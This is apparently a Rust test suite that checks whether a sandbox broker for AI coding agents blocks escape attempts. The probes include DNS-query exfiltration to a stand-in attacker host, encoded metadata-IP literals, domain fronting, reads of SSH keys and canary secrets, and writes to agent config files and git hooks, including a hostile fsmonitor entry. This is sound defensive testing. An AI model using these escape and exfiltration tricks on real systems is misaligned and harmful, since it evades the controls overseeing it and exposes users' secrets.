//! M0 conformance categories 3, 4, 5, 9 and 10 (Conformance Probe Matrix),
//! run through real `broker run` sessions on the host backend.
//! Each out-of-policy probe must be denied (and network denies logged with
//! the expected reason); each category has an in-policy control.

use audit::Reason;
use conformance::*;

fn assert_denied(r: &ProbeResult, what: &str) {
    assert!(
        r.denied(),
        "{what}: expected DENIED, got code {} stdout={} stderr={}",
        r.code,
        r.stdout.trim(),
        r.stderr.trim()
    );
}

fn assert_allowed(r: &ProbeResult, what: &str) {
    assert!(
        r.allowed(),
        "{what}: expected ALLOWED, got code {} stdout={} stderr={}",
        r.code,
        r.stdout.trim(),
        r.stderr.trim()
    );
}

fn upstream_harness(extra: &str) -> (Harness, Upstream) {
    let up = Upstream::start();
    let h = Harness::new(&config_with_upstream(up.port, extra));
    (h, up)
}

/// The in-policy control every category shares: the granted upstream is
/// reachable through both ingress modes.
fn control(h: &Harness, up: &Upstream) {
    let p = up.port.to_string();
    assert_allowed(&h.probe(&["proxy", "connect", "allowed.test", &p, "allowed.test"]), "control via CONNECT");
    assert_allowed(&h.probe(&["proxy", "socks5", "allowed.test", &p, "allowed.test"]), "control via SOCKS5");
}

#[test]
fn cat03_name_resolution() {
    let (h, up) = upstream_harness("[[egress]]\nhost = \"dns.google\"\n");
    control(&h, &up);
    // No resolver inside the sandbox: libc resolution, UDP/53, TCP/53 (TXT) all fail.
    assert_denied(&h.probe(&["dns", "example.com"]), "libc name resolution");
    assert_denied(&h.probe(&["dns-udp", "8.8.8.8", "exfil.attacker.example", "16"]), "DNS TXT over UDP/53");
    assert_denied(&h.probe(&["dns-tcp", "8.8.8.8", "exfil.attacker.example", "16"]), "DNS over TCP/53");
    assert_denied(&h.probe(&["tcp", "1.1.1.1", "853"]), "DoT");
    // DoH endpoints are blocked by name even when a grant names them.
    assert_denied(&h.probe(&["proxy", "connect", "dns.google", "443", "dns.google"]), "DoH");
    // Data in query names never leaves: the name is not admitted, so never resolved.
    assert_denied(
        &h.probe(&["proxy", "connect", "c2VjcmV0LXRva2Vu.exfil.attacker.example", "443", "-"]),
        "query-name exfil",
    );
    let reasons = h.deny_reasons();
    assert!(reasons.contains(&Reason::DohEndpoint), "{reasons:?}");
    assert!(reasons.contains(&Reason::HostNotAllowed), "{reasons:?}");
}

#[test]
fn cat04_ip_literals_and_encodings() {
    let (h, up) = upstream_harness(
        "[[egress]]\nhost = \"meta.test\"\naddrs = [\"169.254.169.254\"]\n\n[[egress]]\nhost = \"intranet.test\"\naddrs = [\"10.1.2.3\"]\n",
    );
    control(&h, &up);
    let cases: &[(&str, Reason)] = &[
        ("169.254.169.254", Reason::IpLiteral),
        ("2130706433", Reason::AmbiguousIpLiteral),
        ("0x7f000001", Reason::AmbiguousIpLiteral),
        ("0177.0.0.1", Reason::AmbiguousIpLiteral),
        ("127.1", Reason::AmbiguousIpLiteral),
        ("0xa9fea9fe", Reason::AmbiguousIpLiteral),
        ("[::ffff:169.254.169.254]", Reason::MappedV6),
        ("[::1]", Reason::IpLiteral),
        ("8.8.8.8", Reason::IpLiteral),
    ];
    for (host, want) in cases {
        for mode in ["connect", "socks5"] {
            let r = h.probe(&["proxy", mode, host, "443", "-"]);
            assert_denied(&r, &format!("{host} via {mode}"));
            assert!(r.stdout.contains(want.as_str()) || mode == "socks5", "{host} via {mode}: {}", r.stdout);
        }
    }
    // Policy applies to the address the broker resolved, not the name sent.
    assert_denied(&h.probe(&["proxy", "connect", "meta.test", "443", "meta.test"]), "name -> metadata address");
    assert_denied(&h.probe(&["proxy", "socks5", "intranet.test", "443", "intranet.test"]), "name -> RFC1918 address");
    let reasons = h.deny_reasons();
    for want in
        [Reason::IpLiteral, Reason::AmbiguousIpLiteral, Reason::MappedV6, Reason::MetadataAddr, Reason::PrivateAddr]
    {
        assert!(reasons.contains(&want), "missing {want:?} in {reasons:?}");
    }
}

#[test]
fn cat05_alternate_protocols() {
    let (h, up) = upstream_harness("[[egress]]\nhost = \"github.com\"\naddrs = [\"140.82.112.3\"]\n");
    control(&h, &up);
    let p = up.port.to_string();
    assert_denied(&h.probe(&["tcp", "1.1.1.1", "443"]), "raw TCP");
    assert_denied(&h.probe(&["udp", "1.1.1.1", "443"]), "QUIC / UDP 443");
    assert_denied(&h.probe(&["icmp", "1.1.1.1"]), "ICMP");
    assert_denied(&h.probe(&["proxy", "connect", "github.com", "22", "-"]), "SSH port through the proxy");
    assert_denied(&h.probe(&["proxy", "connect", "allowed.test", &p, "raw"]), "non-TLS bytes in an allowed tunnel");
    assert_denied(&h.probe(&["proxy", "connect", "allowed.test", &p, "socks"]), "nested SOCKS in an allowed tunnel");
    assert_denied(
        &h.probe(&["proxy", "connect", "allowed.test", &p, "evil.example"]),
        "domain fronting (SNI != CONNECT)",
    );
    let reasons = h.deny_reasons();
    for want in [Reason::PortNotAllowed, Reason::SniLess, Reason::ConnectSniMismatch] {
        assert!(reasons.contains(&want), "missing {want:?} in {reasons:?}");
    }
}

#[test]
fn cat09_proxy_bypass() {
    let (h, up) = upstream_harness("");
    control(&h, &up);
    let tcp = HostTcp::start();
    let udp = HostUdp::start();
    let sock = HostUnix::start();
    assert_denied(&h.probe(&["tcp", "127.0.0.1", &tcp.port.to_string()]), "host loopback TCP service");
    assert_denied(&h.probe(&["tcp", "1.1.1.1", "443"]), "direct socket ignoring proxy variables");
    let _ = h.probe(&["udp", "127.0.0.1", &udp.port.to_string()]);
    assert_denied(&h.probe(&["unix", &sock.path.display().to_string()]), "host Unix socket (docker.sock stand-in)");
    let ctl = h.home.path().join("run/ctl.sock");
    assert_denied(&h.probe(&["unix", &ctl.display().to_string()]), "brokerd control socket");
    // Client-side proxy overrides change nothing: the sandbox has no other route.
    let r =
        h.probe_with(None, &["tcp", "1.1.1.1", "443"], &[("NO_PROXY", "*"), ("HTTPS_PROXY", ""), ("ALL_PROXY", "")]);
    assert_denied(&r, "direct socket with proxy env cleared by the client");
    std::thread::sleep(std::time::Duration::from_millis(200));
    assert_eq!(tcp.accepts.load(std::sync::atomic::Ordering::SeqCst), 0, "host TCP service was reached");
    assert_eq!(udp.datagrams.load(std::sync::atomic::Ordering::SeqCst), 0, "host UDP service was reached");
    assert_eq!(sock.accepts.load(std::sync::atomic::Ordering::SeqCst), 0, "host Unix socket was reached");
}

#[test]
fn cat10_filesystem() {
    let secrets = tempfile::Builder::new().prefix("bks.").tempdir_in("/tmp").unwrap();
    let secrets_dir = secrets.path().canonicalize().unwrap();
    std::fs::write(secrets_dir.join("canary-key"), "CANARY-SECRET-7f3a").unwrap();
    let cfg = format!("version = 1\n\n[filesystem]\ndeny_read = [\"{}\"]\n", secrets_dir.display());
    let h = Harness::new(&cfg);
    let repo = h.repo_path();
    let r = |p: &str| repo.join(p).display().to_string();
    // Controls: the repository is writable and git commits work.
    assert_allowed(&h.probe(&["write", &r("src.txt")]), "write in the repo");
    assert_allowed(&h.probe(&["read", &r("README.md")]), "read in the repo");
    // Secret reads.
    assert_denied(
        &h.probe(&["read", &secrets_dir.join("canary-key").display().to_string()]),
        "policy deny_read canary",
    );
    let home = std::env::var("HOME").unwrap();
    let ssh_key = format!("{home}/.ssh/id_ed25519");
    if std::path::Path::new(&ssh_key).exists() {
        assert_denied(&h.probe(&["read", &ssh_key]), "~/.ssh/id_ed25519");
    }
    assert_denied(&h.probe(&["read", &h.audit_db().display().to_string()]), "audit log (I9)");
    // Writes to protected names inside the writable repo (I5).
    for p in [
        ".git/hooks/pre-commit",
        ".git/config",
        ".claude/settings.json",
        ".mcp.json",
        ".vscode/settings.json",
        ".envrc",
        ".codex/config.toml",
        ".broker/broker.toml",
    ] {
        assert_denied(&h.probe(&["write", &r(p)]), p);
    }
    assert_denied(&h.probe(&["mkdir", &r(".cursor/rules")]), ".cursor");
    // Writes outside the grants, including `..` traversal.
    assert_denied(&h.probe(&["write-new", &format!("{home}/.broker-probe-{}", std::process::id())]), "write in $HOME");
    let outside = repo.parent().unwrap().join(format!("broker-probe-outside-{}", std::process::id()));
    let dotdot = format!("{}/../{}", repo.display(), outside.file_name().unwrap().to_string_lossy());
    let res = h.probe(&["write-new", &dotdot]);
    // macOS: denied. Linux: /tmp inside the sandbox is a private tmpfs, so the
    // write may succeed there; either way the host path must be untouched.
    assert!(!outside.exists(), "`..` traversal wrote {} on the host: {res:?}", outside.display());
    if cfg!(target_os = "macos") {
        assert_denied(&res, "`..` out of the repo");
    }
    // Link and rename tricks.
    assert_denied(&h.probe(&["rename", &r(".git"), &r(".gitx")]), "rename .git (replant gitdir)");
    std::fs::write(repo.join("evil-config"), "[core]\n\tfsmonitor = touch /tmp/pwned\n").unwrap();
    assert_denied(&h.probe(&["rename", &r("evil-config"), &r(".git/config")]), "rename over .git/config");
    assert_denied(&h.probe(&["hardlink", &r(".git/config"), &r("cfg-link")]), "hardlink to .git/config");
    assert_allowed(
        &h.probe(&["symlink", &repo.join(".git/hooks").display().to_string(), &r("hooks-link")]),
        "symlink creation",
    );
    assert_denied(&h.probe(&["write", &r("hooks-link/post-commit")]), "write through a symlink into .git/hooks");
    assert_allowed(
        &h.probe(&["symlink", &secrets_dir.join("canary-key").display().to_string(), &r("secret-link")]),
        "symlink creation",
    );
    assert_denied(&h.probe(&["read", &r("secret-link")]), "read a secret through a symlink");
    // A secret created after the session started is still unreadable.
    let late = secrets_dir.join("late-key");
    let child = h.spawn_probe(&["read-when-exists", &late.display().to_string(), "5"]);
    std::thread::sleep(std::time::Duration::from_millis(800));
    std::fs::write(&late, "LATE-SECRET").unwrap();
    let out: ProbeResult = child.wait_with_output().unwrap().into();
    assert!(out.code == 10 || out.code == 20, "late secret readable: {out:?}");
    // The host-side file was never modified by the sandbox.
    let cfg_now = std::fs::read_to_string(repo.join(".git/config")).unwrap();
    assert!(!cfg_now.contains("fsmonitor"), ".git/config was modified");
    assert!(!repo.join(".git/hooks/pre-commit").exists());
    // Placeholders (Linux) are removed at teardown; nothing new is left behind.
    for p in [".mcp.json", ".envrc", ".claude", ".vscode", ".codex", ".cursor", ".broker"] {
        assert!(!repo.join(p).exists(), "{p} left in the repository after the session");
    }
}

#[test]
fn cat10_non_repo_directory_cannot_grow_git_hooks() {
    // In a directory that is not a repository, the agent must not be able to
    // create `.git/hooks` that the user's next unsandboxed git would run.
    let h = Harness::new("version = 1\n");
    let repo = h.repo_path();
    std::fs::remove_dir_all(repo.join(".git")).unwrap();
    let r = h.probe(&["mkdir", &repo.join(".git/hooks").display().to_string()]);
    assert!(r.denied(), "{r:?}");
    assert!(!repo.join(".git/hooks").exists());
    assert!(!repo.join(".git").exists(), "placeholder removed at teardown");
}

#[test]
fn cat10_git_commit_still_works() {
    let h = Harness::new("version = 1\n");
    if std::process::Command::new("git").arg("--version").output().is_err() {
        return;
    }
    let repo = h.repo_path();
    std::fs::write(repo.join("a.txt"), "a\n").unwrap();
    let r = h.run_argv(
        None,
        &[
            "/bin/sh".into(),
            "-c".into(),
            "git add a.txt && git -c user.email=a@b -c user.name=probe -c commit.gpgsign=false commit -q -m probe"
                .into(),
        ],
        &[],
    );
    assert_eq!(r.code, 0, "local commit inside the sandbox: {r:?}");
}
